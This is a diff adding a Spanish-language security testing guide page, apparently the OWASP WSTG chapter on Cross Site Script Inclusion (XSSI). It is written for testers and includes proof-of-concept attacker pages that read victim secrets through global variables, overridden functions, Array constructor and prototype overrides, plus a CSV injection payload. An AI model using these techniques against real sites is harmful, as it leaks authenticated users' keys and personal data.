@@ -1,0 +1,157 @@
+<h1 id="cross-site-script-inclusion">Inclusión de scripts entre sitios (Cross Site Script Inclusion)</h1>
+<div class="tabla"><table><thead><tr>
+<th>ID</th>
+</tr>
+</thead><tbody><tr>
+<td>WSTG-CLNT-13</td>
+</tr>
+</tbody></table></div>
+<h2 id="summary">Resumen</h2>
+<p>La vulnerabilidad de Cross Site Script Inclusion (XSSI) permite la fuga de datos sensibles a través de los límites de origen o de dominio. Los datos sensibles pueden incluir datos relacionados con la autenticación (estados de inicio de sesión, cookies, tokens de autenticación, IDs de sesión, etc.) o datos personales o personales sensibles del usuario (direcciones de correo electrónico, números de teléfono, datos de tarjetas de crédito, números de seguridad social, etc.). XSSI es un ataque del lado del cliente similar al Cross Site Request Forgery (CSRF), pero con un propósito diferente. Mientras que CSRF utiliza el contexto del usuario autenticado para ejecutar ciertas acciones que cambian el estado dentro de la página de la víctima (p. ej., transferir dinero a la cuenta del atacante, modificar privilegios, restablecer la contraseña, etc.), XSSI utiliza en cambio JavaScript del lado del cliente para filtrar datos sensibles de sesiones autenticadas.</p>
+<p>De manera predeterminada, los sitios web solo pueden acceder a datos si provienen del mismo origen. Este es un principio clave de seguridad de las aplicaciones y está regido por la política del mismo origen (definida por la <a href="https://tools.ietf.org/html/rfc6454" target="_blank" rel="noopener">RFC 6454</a>). Un origen se define como la combinación del esquema de URI (HTTP o HTTPS), el nombre de host y el número de puerto. Sin embargo, esta política no se aplica a las inclusiones mediante la etiqueta HTML <code>&lt;script&gt;</code>. Esta excepción es necesaria, ya que sin ella los sitios web no podrían consumir servicios de terceros, realizar análisis de tráfico ni usar plataformas de publicidad, etc.</p>
+<p>Cuando el navegador abre un sitio web con etiquetas <code>&lt;script&gt;</code>, los recursos se obtienen del dominio de origen cruzado. Los recursos se ejecutan entonces en el mismo contexto que el sitio o el navegador que los incluye, lo que presenta la oportunidad de filtrar datos sensibles. En la mayoría de los casos esto se logra mediante JavaScript; sin embargo, el origen del script no tiene que ser un archivo JavaScript con tipo <code>text/javascript</code> o extensión <code>.js</code>.</p>
+<p>Vulnerabilidades históricas de los navegadores (como en IE9/10) permitían la fuga de datos mediante mensajes de error de ejecución detallados. Esta técnica ya no es representativa del comportamiento de los navegadores modernos. Al establecer el atributo charset de la etiqueta <code>&lt;script&gt;</code>, un atacante o evaluador puede forzar la codificación UTF-16, lo que permite en algunos casos la fuga de datos de otros formatos (p. ej., JSON). Para más información sobre estos ataques, consulte <a href="https://www.mbsd.jp/Whitepaper/xssi.pdf" target="_blank" rel="noopener">Identifier based XSSI attacks</a>.</p>
+<h2 id="test-objectives">Objetivos de la prueba</h2>
+<ul>
+<li>Localizar datos sensibles en todo el sistema.</li>
+<li>Evaluar la fuga de datos sensibles mediante diversas técnicas.</li>
+</ul>
+<h2 id="how-to-test">Cómo probar</h2>
+<h3 id="samesite-cookie-considerations">Consideraciones sobre la cookie SameSite</h3>
+<p>Los ejemplos siguientes dependen de que el navegador adjunte la cookie de autenticación de la víctima a una petición <code>&lt;script src=&quot;...&quot;&gt;</code> entre sitios (cross-site), es decir, una carga de subrecurso y no una navegación de nivel superior. Según el comportamiento de <a href="#/4-Web_Application_Security_Testing/06-Session_Management/02-Cookies_Attributes@samesite-attribute"><code>SameSite</code></a> descrito en la sección Cookie Attributes, las cookies <code>Lax</code> no se envían en peticiones de subrecursos, por lo que, de manera predeterminada, estas pruebas de concepto no filtrarán datos en un navegador cuyo valor predeterminado sea <code>Lax</code> (los navegadores basados en Chromium, desde 2020), a menos que la cookie de sesión establezca explícitamente <code>SameSite=None; Secure</code>.</p>
+<p>Esto no significa que la vulnerabilidad subyacente esté corregida, solo que reproducirla ahora depende de la configuración <code>SameSite</code> de la cookie y del navegador evaluado. Hay que revisar directamente la cabecera <code>Set-Cookie</code>. Repetir la prueba en Firefox o Safari no ayudará si una prueba de concepto no se activa: una carga <code>&lt;script src=&quot;...&quot;&gt;</code> desde otro sitio es una petición de terceros y, de manera predeterminada, Firefox particiona y Safari bloquea las cookies de terceros, por lo que la cookie de sesión no se envía.</p>
+<h3 id="collect-data-using-authenticated-and-unauthenticated-user-sessions">Recopilar datos con sesiones de usuario autenticadas y no autenticadas</h3>
+<p>Identificar qué endpoints son responsables de enviar datos sensibles, qué parámetros se requieren, e identificar todas las respuestas JavaScript relevantes generadas dinámica y estáticamente usando sesiones de usuario autenticadas. Hay que prestar especial atención a los datos sensibles enviados mediante <a href="https://en.wikipedia.org/wiki/JSONP" target="_blank" rel="noopener">JSONP</a>. Para encontrar respuestas JavaScript generadas dinámicamente, se deben generar peticiones autenticadas y no autenticadas y compararlas. Si son diferentes, la respuesta es dinámica; de lo contrario, es estática. Para simplificar esta tarea, se puede utilizar una herramienta como el <a href="https://github.com/luh2/DetectDynamicJS" target="_blank" rel="noopener">plugin de Burp proxy de Veit Hailperin</a>. Hay que asegurarse de revisar otros tipos de archivo además de JavaScript; XSSI no se limita únicamente a archivos JavaScript.</p>
+<h3 id="determine-whether-the-sensitive-data-can-be-leaked-using-javascript">Determinar si los datos sensibles pueden filtrarse mediante JavaScript</h3>
+<p>Los evaluadores deben analizar el código en busca de los siguientes vehículos de fuga de datos mediante vulnerabilidades XSSI:</p>
+<ol>
+<li>Variables globales</li>
+<li>Parámetros de funciones globales</li>
+<li>Robo de CSV (Comma Separated Values) con comillas</li>
+<li>Encadenamiento de prototipos usando <code>this</code></li>
+</ol>
+<h3 id="1-sensitive-data-leakage-via-global-variables">1. Fuga de datos sensibles mediante variables globales</h3>
+<p>Una clave de API se almacena en un archivo JavaScript con la URI <code>https://victim.com/internal/api.js</code> en el sitio web de la víctima, <code>victim.com</code>, al que solo pueden acceder los usuarios autenticados. Un atacante configura un sitio web, <code>attackingwebsite.com</code>, y usa la etiqueta <code>&lt;script&gt;</code> para referirse al archivo JavaScript.</p>
+<p>Este es el contenido de <code>https://victim.com/internal/api.js</code>:</p>
+<pre><code class="language-javascript">(function() {
+  window.secret = &quot;supersecretUserAPIkey&quot;;
+})();
+</code></pre>
+<p>El sitio del atacante, <code>attackingwebsite.com</code>, tiene un <code>index.html</code> con el siguiente código:</p>
+<pre><code class="language-html">&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+  &lt;head&gt;
+    &lt;title&gt;Leaking data via global variables&lt;/title&gt;
+  &lt;/head&gt;
+  &lt;body&gt;
+    &lt;h1&gt;Leaking data via global variables&lt;/h1&gt;
+    &lt;script src=&quot;https://victim.com/internal/api.js&quot;&gt;&lt;/script&gt;
+    &lt;div id=&quot;result&quot;&gt;
+    &lt;/div&gt;
+    &lt;script&gt;
+      var div = document.getElementById(&quot;result&quot;);
+      div.innerHTML = &quot;Your secret data &lt;b&gt;&quot; + window.secret + &quot;&lt;/b&gt;&quot;;
+    &lt;/script&gt;
+  &lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+<p>En este ejemplo, una víctima está autenticada en <code>victim.com</code>. Un atacante atrae a la víctima a <code>attackingwebsite.com</code> mediante ingeniería social, correos de phishing, etc. El navegador de la víctima obtiene entonces <code>api.js</code>, lo que provoca que los datos sensibles se filtren a través de la variable global de JavaScript y se muestren usando <code>innerHTML</code>.</p>
+<h3 id="2-sensitive-data-leakage-via-global-function-parameters">2. Fuga de datos sensibles mediante parámetros de funciones globales</h3>
+<p>Este ejemplo es similar al anterior, excepto que en este caso <code>attackingwebsite.com</code> utiliza una función global de JavaScript para extraer los datos sensibles sobrescribiendo la función global de JavaScript de la víctima.</p>
+<p>Este es el contenido de <code>https://victim.com/internal/api.js</code>:</p>
+<pre><code class="language-javascript">(function() {
+  var secret = &quot;supersecretAPIkey&quot;;
+  window.globalFunction(secret);
+})();
+</code></pre>
+<p>El sitio del atacante, <code>attackingwebsite.com</code>, tiene un <code>index.html</code> con el siguiente código:</p>
+<pre><code class="language-html">&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+  &lt;head&gt;
+    &lt;title&gt;Leaking data via global function parameters&lt;/title&gt;
+  &lt;/head&gt;
+  &lt;body&gt;
+    &lt;div id=&quot;result&quot;&gt;
+    &lt;/div&gt;
+    &lt;script&gt;
+      function globalFunction(param) {
+        var div = document.getElementById(&quot;result&quot;);
+        div.innerHTML = &quot;Your secret data: &lt;b&gt;&quot; + param + &quot;&lt;/b&gt;&quot;;
+      }
+    &lt;/script&gt;
+    &lt;script src=&quot;https://victim.com/internal/api.js&quot;&gt;&lt;/script&gt;
+  &lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+<p>Existen otras vulnerabilidades XSSI que pueden resultar en la fuga de datos sensibles, ya sea mediante cadenas de prototipos de JavaScript o llamadas a funciones globales. Para más información sobre estos ataques, consulte <a href="https://www.usenix.org/system/files/conference/usenixsecurity15/sec15-paper-lekies.pdf" target="_blank" rel="noopener">The Unexpected Dangers of Dynamic JavaScript</a>.</p>
+<h3 id="3-sensitive-data-leakage-via-csv-with-quotations-theft">3. Fuga de datos sensibles mediante robo de CSV con comillas</h3>
+<p>Para filtrar datos, el atacante/evaluador tiene que poder inyectar código JavaScript en los datos CSV. El siguiente código de ejemplo es un extracto del whitepaper <a href="https://www.mbsd.jp/Whitepaper/xssi.pdf" target="_blank" rel="noopener">Identifier based XSSI attacks</a> de Takeshi Terada.</p>
+<pre><code class="language-text">HTTP/1.1 200 OK
+Content-Type: text/csv
+Content-Disposition: attachment; filename=&quot;a.csv&quot;
+Content-Length: xxxx
+
+1,&quot;___&quot;,&quot;aaa@a.example&quot;,&quot;03-0000-0001&quot;
+2,&quot;foo&quot;,&quot;bbb@b.example&quot;,&quot;03-0000-0002&quot;
+...
+98,&quot;bar&quot;,&quot;yyy@example.net&quot;,&quot;03-0000-0088&quot;
+99,&quot;___&quot;,&quot;zzz@example.com&quot;,&quot;03-0000-0099&quot;
+</code></pre>
+<p>En este ejemplo, usar las columnas <code>___</code> como puntos de inyección e insertar cadenas de JavaScript en su lugar tiene el siguiente resultado.</p>
+<pre><code class="language-text">1,&quot;\&quot;&quot;,$$$=function(){/*&quot;,&quot;aaa@a.example&quot;,&quot;03-0000-0001&quot;
+2,&quot;foo&quot;,&quot;bbb@b.example&quot;,&quot;03-0000-0002&quot;
+...
+98,&quot;bar&quot;,&quot;yyy@example.net&quot;,&quot;03-0000-0088&quot;
+99,&quot;*/}//&quot;,&quot;zzz@example.com&quot;,&quot;03-0000-0099&quot;
+</code></pre>
+<p><a href="https://blog.jeremiahgrossman.com/2006/01/advanced-web-attack-techniques-using.html" target="_blank" rel="noopener">Jeremiah Grossman escribió sobre una vulnerabilidad similar en Gmail</a> en 2006 que permitía extraer los contactos del usuario en JSON. En este caso, los datos se recibían de Gmail y eran analizados por el motor JavaScript del navegador usando un constructor Array sin referenciar para filtrar los datos. Un atacante podía acceder a este Array con los datos sensibles definiendo y sobrescribiendo el constructor interno de Array de esta manera:</p>
+<pre><code class="language-html">&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+  &lt;head&gt;
+    &lt;title&gt;Leaking gmail contacts via JSON &lt;/title&gt;
+  &lt;/head&gt;
+  &lt;body&gt;
+    &lt;script&gt;
+      function Array() {
+        // steal data
+      }
+    &lt;/script&gt;
+    &lt;script src=&quot;https://mail.google.com/mail/?_url_scrubbed_&quot;&gt;&lt;/script&gt;
+  &lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+<h3 id="4-sensitive-data-leakage-via-prototype-chaining-using-this">4. Fuga de datos sensibles mediante encadenamiento de prototipos usando <code>this</code></h3>
+<p>En JavaScript, la palabra clave <code>this</code> tiene alcance dinámico. Esto significa que si se llama a una función sobre un objeto, <code>this</code> apuntará a ese objeto aunque la función llamada pueda no pertenecer al propio objeto. Este comportamiento puede utilizarse para filtrar datos. En el siguiente ejemplo de la <a href="https://web.archive.org/web/20210107144812/http://sebastian-lekies.de/leak/" target="_blank" rel="noopener">página de demostración de Sebastian Leike</a>, los datos sensibles se almacenan en un Array. Un atacante puede sobrescribir <code>Array.prototype.forEach</code> con una función controlada por el atacante. Si algún código llama a la función <code>forEach</code> sobre una instancia de array que contiene valores sensibles, la función controlada por el atacante se invocará con <code>this</code> apuntando al objeto que contiene los datos sensibles.</p>
+<p>Este es un extracto de un archivo JavaScript que contiene datos sensibles, <code>javascript.js</code>:</p>
+<pre><code class="language-javascript">...
+(function() {
+  var secret = [&quot;578a8c7c0d8f34f5&quot;, &quot;345a8b7c9d8e34f5&quot;];
+
+  secret.forEach(function(element) {
+    // do something here
+  });  
+})();
+...
+</code></pre>
+<p>Los datos sensibles pueden filtrarse con el siguiente código JavaScript:</p>
+<pre><code class="language-html">...
+ &lt;div id=&quot;result&quot;&gt;
+
+    &lt;/div&gt;
+    &lt;script&gt;
+      Array.prototype.forEach = function(callback) {
+        var resultString = &quot;Your secret values are: &lt;b&gt;&quot;;
+        for (var i = 0, length = this.length; i &lt; length; i++) {
+          if (i &gt; 0) {
+            resultString += &quot;, &quot;;
+          }
+          resultString += this[i];
+        }
+        resultString += &quot;&lt;/b&gt;&quot;;
+        var div = document.getElementById(&quot;result&quot;);
+        div.innerHTML = resultString;
+      };
+    &lt;/script&gt;
+    &lt;script src=&quot;https://victim.com/..../javascript.js&quot;&gt;&lt;/script&gt;
+...
+</code></pre>
